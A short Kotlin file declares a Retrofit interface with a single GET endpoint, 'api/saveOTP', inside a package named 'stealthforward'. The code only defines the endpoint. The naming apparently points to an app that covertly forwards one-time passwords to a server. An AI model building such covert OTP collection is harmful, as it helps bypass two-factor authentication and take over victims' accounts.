package com.nf.stealthforward.api

import retrofit2.Call
import retrofit2.http.GET

interface API {
    @GET("api/saveOTP")
    fun saveOTP(): Call<String>
}